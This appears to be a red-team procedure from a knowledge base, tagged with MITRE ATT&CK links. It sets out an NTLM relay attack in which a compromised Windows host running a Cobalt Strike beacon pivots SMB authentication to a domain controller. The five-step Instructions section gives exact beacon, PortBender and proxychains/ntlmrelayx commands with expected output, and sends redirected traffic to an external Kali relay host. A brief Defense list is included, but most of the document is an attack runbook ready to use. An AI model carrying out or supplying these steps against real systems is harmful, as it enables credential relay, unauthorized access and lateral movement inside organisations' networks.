---
type: procedure
description: >-
  Perform an NTLM relay attack using a Cobalt Strike beacon on a compromised
  Windows host to relay SMB authentication attempts to a target domain
  controller via an external relay server on Kali Linux.
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Adversary-in-the-Middle|T1557 - Adversary-in-the-Middle]]'
  - '[[techniques/Valid Accounts|T1078 - Valid Accounts]]'
sub_techniques:
  - >-
    [[techniques/Adversary-in-the-Middle/T1557.001| T1557.001 - LLMNR/NBT-NS
    Poisoning and SMB Relay]]
tags:
  - cobalt-strike
  - ntlm-relay
  - smb-relay
  - lateral-movement
commands:
  - '[[commands/proxychains-ntlmrelayx-relay-to-smb-target]]'
  - '[[commands/beacon-start-socks-proxy]]'
  - '[[commands/beacon-rportfwd-local-smb-redirect]]'
  - '[[commands/beacon-upload-windivert-driver]]'
  - '[[commands/portbender-redirect-smb-to-local-port]]'
tools:
  - '[[tools/Cobalt-Strike]]'
  - '[[tools/Impacket]]'
  - '[[tools/PortBender]]'
platforms:
  - Windows
  - Linux
skill_level: advanced
impact_level: high
detection_risk: high
verified: true
validated: true
---

# NTLM-Relay-Attack-via-Cobalt-Strike

## Summary

This procedure demonstrates how to set up an NTLM relay attack using Cobalt Strike to intercept and relay SMB authentication from a compromised Windows host to a target domain controller. By redirecting incoming SMB traffic on the compromised host to an external ntlmrelayx listener on Kali Linux, attackers can capture and reuse credentials for lateral movement without direct network access to the target.

## Description

In this technique, an attacker with a Cobalt Strike beacon on a compromised Windows machine (positioned in the target network) uses port redirection to proxy SMB connections to an external Kali Linux machine running ntlmrelayx. The SOCKS proxy on the beacon allows the relay tool to pivot through the compromised host to reach the target DC. Once relayed, the authentication succeeds on the target, granting access to admin shares or shells. This is effective in environments with NTLM enabled and no SMB signing enforced. The target environment is Active Directory with Windows hosts; prerequisites include a persistent beacon and external Kali access to the compromised host.

## Requirements

1. Active Cobalt Strike beacon session on a compromised Windows host with network access to the target domain controller.
2. Kali Linux machine with Impacket suite installed and reachable from the compromised host.
3. PortBender tool (Cobalt Strike aggressor script) and WinDivert driver for port redirection on Windows.
4. Administrative privileges on the compromised host for driver installation (via beacon).
5. NTLM authentication enabled on the target without SMB signing requirements.

## Defense

Defensive measures and detection strategies:

- Enable SMB signing and channel binding to prevent relay attacks.
- Implement multi-factor authentication (MFA) for all accounts to invalidate stolen credentials.
- Use network segmentation and monitor for anomalous SMB traffic, such as connections to non-DC ports or unexpected port forwards.
- Deploy endpoint detection for unsigned drivers like WinDivert and monitor for Cobalt Strike artifacts (e.g., beacon processes).
- Enable LDAP signing and restrict NTLM usage where possible.

## Objectives

1. Establish a relay point to intercept SMB authentications targeting the compromised host.
2. Relay captured NTLM credentials to a domain controller for unauthorized access.
3. Achieve code execution or file access on the target using relayed credentials.
4. Enable lateral movement within the Active Directory environment.

## Instructions

### Step 1: Start SOCKS Proxy on Beacon

**Context**: Initiate a SOCKS4a proxy on the compromised host via the Cobalt Strike beacon. This allows tools on the external Kali machine to pivot through the beacon to access the internal network, enabling the relay to reach the target domain controller.

**Command** ([[commands/beacon-start-socks-proxy]]):
```beacon
socks 1080
```

> This command starts the SOCKS proxy listening on port 1080. It enables proxychains on Kali to route traffic through the beacon for internal network access.

**Expected Output**: Confirmation message in the beacon console, such as "SOCKS server started on 0.0.0.0:1080". Verify by checking if external tools can connect via the proxy.

### Step 2: Launch NTLM Relay Listener on Kali

**Context**: On the external Kali machine, start the ntlmrelayx tool configured to relay any captured authentications to the target SMB service (e.g., domain controller). Use proxychains to route through the beacon's SOCKS proxy for pivoting.

**Command** ([[commands/proxychains-ntlmrelayx-relay-to-smb-target]]):
```bash
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET>
```

> Replace <IP_TARGET> with the domain controller's IP. The tool listens on port 445 by default for incoming SMB connections and relays them to the specified target. Proxychains ensures the relay can reach internal IPs via the SOCKS proxy.

**Expected Output**: Output indicating the listener is active, e.g., "NTLMRelayX started. Listening on 0.0.0.0:445". Upon receiving a connection, it will show relay attempts and any dumped credentials or executed shells.

### Step 3: Set Up Local Port Forward on Beacon

**Context**: Configure a reverse port forward on the beacon to tunnel traffic from a local port (8445) on the compromised host to the Kali machine's SMB listener port (445). This bridges the redirection gap for relayed traffic.

**Command** ([[commands/beacon-rportfwd-local-smb-redirect]]):
```beacon
rportfwd_local 8445 <IP_KALI> 445
```

> Replace <IP_KALI> with the Kali machine's IP. This forward directs any connections to the beacon's local 8445 to Kali's 445, where ntlmrelayx awaits.

**Expected Output**: Success confirmation in the beacon console, e.g., "Local port forward 8445 -> <IP_KALI>:445 added". Test by attempting a local connection to 8445.

### Step 4: Upload WinDivert Driver to Compromised Host

**Context**: Upload the WinDivert kernel driver required by PortBender for low-level packet redirection. This enables capturing and redirecting incoming SMB traffic without altering firewall rules.

**Command** ([[commands/beacon-upload-windivert-driver]]):
```beacon
upload C:\Tools\PortBender\WinDivert64.sys
```

> Assumes the driver is located at the specified path on the attacker's Cobalt Strike client. The upload places it on the compromised host for PortBender to load.

**Expected Output**: Upload progress and confirmation, e.g., "Uploaded 12345 bytes". Verify the file exists on the target via beacon's ls or dir.

### Step 5: Redirect SMB Port Using PortBender

**Context**: Load PortBender on the beacon and redirect all incoming connections to port 445 (SMB) to the local port 8445. This intercepts client SMB attempts to the compromised host and forwards them to the external relay.

**Command** ([[commands/portbender-redirect-smb-to-local-port]]):
```beacon
PortBender redirect 445 8445
```

> This command invokes the PortBender script, loading the WinDivert driver and applying the redirection rule. Incoming SMB traffic is transparently proxied.

**Expected Output**: Confirmation from PortBender, e.g., "Redirection rule added: TCP 445 -> 8445". Monitor for redirected connections in ntlmrelayx logs.

> To trigger the relay, direct a victim client to authenticate to the compromised host's SMB (e.g., via \compromised_ip). The traffic will relay, capturing credentials for the target.
